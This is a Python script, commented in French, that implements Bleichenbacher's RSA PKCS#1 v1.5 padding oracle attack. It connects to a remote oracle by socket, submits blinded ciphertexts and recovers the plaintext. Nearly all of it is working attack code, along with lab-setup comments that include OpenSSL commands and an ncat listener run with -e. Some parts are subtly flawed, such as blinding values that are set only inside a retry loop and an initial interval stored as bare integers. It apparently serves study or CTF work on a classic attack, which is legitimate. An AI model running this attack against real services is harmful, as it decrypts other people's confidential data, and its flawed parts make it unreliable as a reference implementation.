#!/usr/bin/python3
# -*- coding: utf-8 -*-

# RSA Padding Oracle Attack
# Zweisamkeit - zweisamkeit.fr
# 03/12/16
# GNU GPL v3
# http://archiv.infsec.ethz.ch/education/fs08/secsem/Bleichenbacher98.pdf 
# https://www.baigneres.net/downloads/2002_pkcs.pdf

import socket
import random
import sys
import codecs

class Bleichenbacher(object):

  def accueil(self):

    # Accueil

    print ("\n")
    print ("\t~~~~~~~~~~~~~~~~~~~~~~~~~")
    print ("\tAttaque de Bleichenbacher")
    print ("\t       Zweisamkeit       ")
    print ("\t    Licence GNU GPL v3   ")
    print ("\t~~~~~~~~~~~~~~~~~~~~~~~~~")
    print ("\n")

  # Augmente nombre appels recursifs

  sys.setrecursionlimit(10000)

  # Connexion au serveur

  def Connect(self, host, port):

    server=(host, port)

    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sock.connect(server)

    return (sock)

  # Premier entier inférieur ou égal / supérieur ou égal à  x/y

  def Defaut(self, x,y):
    return (x // y)

  def Exces(self,x,y):
    return (self.Defaut(x,y) + (x % y != 0))

  # Génération des clés :

    # openssl genrsa 2048 > private.key
    # openssl rsa -pubout < private.key > public.key 2 > /dev/null

  # Chiffrement du message :

    # echo -en "Je suis Zweisamkeit" | openssl rsautl -encrypt -inkey private.key | xxd -ps | tr -d '\n' > cryptogramme.txt

  # Déchiffrement du message :

    # cat cryptogramme.txt | xxd -r -p | openssl rsautl -decrypt -inkey private.key

  # Module : openssl rsa -pubin -in public.key -modulus 2>/dev/null | grep Modulus | cut -d '=' -f 2

  #n = int(sys.argv[1],16)

  # Exposant publique openssl rsa -in public.key -pubin -text -noout | grep Exponent | cut -d ' ' -f 2

  #e = int(sys.argv[2])

  # Message chiffré cryptogramme.txt

  #c = int(sys.argv[3],16)

  # Oracle ncat -lvp 4444 -e ./oracle --keep-open

  # Appel à Oracle qui va déchiffrer le cryptogramme et indiquer si le padding est valide ou non

  def Oracle(self, y):

    cryptogramme = bytearray.fromhex('{:0512x}'.format(y))
    self.sock.send(cryptogramme)
    reponse = self.sock.recv(1024).decode('utf-8')
    return (reponse.find((self.error).replace('"','')) == -1)

  # Recherche de si dans le cas où l'on a plusieurs encadrements

  def Recherche(self, init):
    si=init
    while True:
      c1 = (self.c0 * (pow(si,self.e,self.n))) % self.n  # Exponentiation modulaire permettant d'optimiser fortement les calculs
      if (self.Oracle(c1)):
        break # On a trouvé le bon si
      si += 1
    return (si)

  # Recherche optimisée de si dans le cas où l'on n'a qu'un seul encadrement

  def Recherche_Binaire(self,si,a,b):
    r = self.Exces((b*si - self.B2)*2,self.n) # Valeur initiale de r
    found = False
    while not found:
      for si in range(self.Exces((self.B2 + r * self.n),b),self.Exces((self.B3-1 + r * self.n),a)+1):
        ci = (self.c0 * (pow(si,self.e,self.n))) % self.n
        if self.Oracle(ci):
          found = True
          break # On a trouvé si
      if not found:
        r  += 1
    return (si)

  # Calcul et affinage des intervalles

  def Affinage(self,si,a,b):
    M = set([]) # Contiendra nouveaux intervalles de m0
    for r in range(self.Exces((a*si - self.B3 + 1),self.n),self.Defaut((b*si - self.B2),self.n) + 1):
      newa = max(a,self.Exces(self.B2 + r*self.n,si)) # Nouvel intervalle de m0
      newb = min(b,self.Defaut(self.B3 - 1 + r*self.n, si))  
      if newa <= newb:
        M |= set([(newa, newb)])
    return (M)

  # Pour déterminer le plaintext à partir de la borne 

  # Coefficients de Bézout

  def Bezout(self,a, b):
      if a == 0 and b == 0:
        return (0, 0, 0)
      if b == 0:
        return (a//abs(a), 0, abs(a))
      (u, v, p) = self.Bezout(b, a%b)
      return (v, (u - v*(a//b)), p)
   
  # Inverse modulaire

  def Inv_mod(self,x, m):
      (u, _, p) = self.Bezout(x, m)
      return (u % abs(m))

  # Iterations

  def Iteration(self,si,M):
    if (len(M) > 1): # S'il y a plusieurs intervalles encadrant le plaintext, on itère sur chaque intervalle - Étape 2.b
      si=self.Recherche(si+1) # En partant de si = si +1
      #print "Nouveau si : ",si
      tmpM = set([])
      for (a,b) in M:
        tmpM.update(self.Affinage(si,a,b)) # Affinage de l'intervalle courante - Étape 3
        M=self.Iteration(si,tmpM)
      #print "Nouveau M : ",M
      self.Iteration(si,M)
    elif (len(M) == 1) : # S'il n'y a qu'un seul intervalle encadrant le plaintext # Étape 4
      (a,b)=(list(M)[0][0],list(M)[0][1])
      if (a==b): # Si l'amplitude de l'unique intervalle est nulle, on a le plaintext
        print ("\tConstruction et affinage des encadrements terminés.\n")
        plaintext = (a * self.Inv_mod(self.s0,self.n)) % self.n
        print ("\tLe message en clair est : \n\n", codecs.decode(hex(plaintext)[3:].replace('L',''),"hex_codec").decode('utf-8','ignore')) # Renvoie le plaintext
        print ("\n\tFin de l'attaque.\n")
        self.sock.close()
        print ("\tConnexion cloturée.\n")
        exit()
      else : # Si l'on n'a qu'un intervalle d'amplitude non nulle, on utilise l'optimisation binaire pour trouver si plus rapidement # Étape 2.c
        si = self.Recherche_Binaire(si,a,b) # On recherche le prochain si de manière optimisée
        #print "si optimisé trouvé : ",si
        M=self.Affinage(si,a,b) # On détermine la liste d'intervalles encadrant le plaintext correspondant - Étape 3
        #print "Intervalle unique : ",M
        self.Iteration(si,M) # On réitère sur cette liste

  # Appel

  def __init__(self, n, e, c, host, port, error):

    self.error = error

    self.n = n
    self.c = c
    self.e = e

    print ("\tÉtablissement de la connexion à l'Oracle...")

    sock = self.Connect(host, port)

    print ("\tConnexion à l'Oracle établie.\n")

    self.sock = sock

    # Initialisation 

    # Blinding - Étape 1

    print ("\tLancement de l'attaque...\n")

    print ("\tBrouillage en cours...")

    maximum=10**10 # Valeur arbitraire
    s0 = random.randint(1,maximum)
    c0 = (c * (pow(s0,e,n))) % n

    while not self.Oracle(c0):
      s0 = random.randint(1,maximum) # Cherche un s0 random tel que c0 soit conforme
      c0 = (c * (pow(s0,self.e,self.n))) % self.n

      self.s0 = s0
      self.c0 = c0

    print ("\tBrouillage terminé.\n")
    #print "s0 random utilisé : ", s0

    k = 256 # Taille du module en bytes
    B = 2**(8*(k-2)) # B
    B2 = 2*B
    B3 = 3*B

    self.B2 = B2
    self.B3 = B3

    M = set([]) # Liste d'encarements initiale
    M |= set([self.B2, self.B3-1])

    # Initialisation - Étape 2.a

    print ("\tConstruction et affinage des encadrements en cours...")

    si = self.Exces(n,3*B) # On initialise si
    si = self.Recherche(si) # On cherche le premier si valable
    #print "si initial trouvé : ",si
    M = self.Affinage(si,B2,B3-1)
    #print "M initial trouvé : ", M # Étape 3

    self.Iteration(si,M)

# Déroulement global de l'attaque :

# Je choisis aléatoirement des s0 jusqu'à  ce que c0 = c * (s0 ** e) % n soit conforme, avec c le cryptogramme, e l'exposant publique et n le module.
# Je cherche le premier si >= n/3B tel que c0 * (si ** e) % n soit conforme.
# Je construis le premier intervalle M de la manière suivante :
  # Pour r allant de Exces((B2*si - B3 + 1),n) à  Defaut((B3*si - B2),n) + 1), je pose newa = max(B2, Exces(B2 + r*n,si)) et newb = min (B3, Defaut(B3 - 1 + r*n, si))
  # Si newa <= newb, on l'intège à  notre nouvelle liste d'intervalles
# Si len(M) > 1, je cherche le prochain si tel que 0 * (si ** e) % n, puis j'affine chaque intervalle (a,b) de M afin de réduire cette liste, dans le but final qu'il n'en reste qu'un :
  # Pour r allant de Exces((a*si - B3 + 1),n) à  Defaut((b*si - B2),n) + 1), je pose newa = max(a, Exces(B2 + r*n,si)) et newb = min (b, Defaut(B3 - 1 + r*n, si))
  # Si newa <= newb, on l'intège à  notre nouvelle liste d'intervalles (si newa > newb, on perd l'intervalle ce qui permettra de n'en avoir qu'un seule au final)
# Si, au contraire, len(M) = 1, je distingue deux cas :
  # Soit les bornes de l'intervalle sont distinctes, et alors on utilise la recherche binaire optimisée pour trouver le prochain si et affiner cet unique intervalle.
  # Soit les bornes de l'intervalle sont égales, et alors on renvoie le plaintext a * Inv_mod(s0,n) % n, a étant l'une de ces bornes.


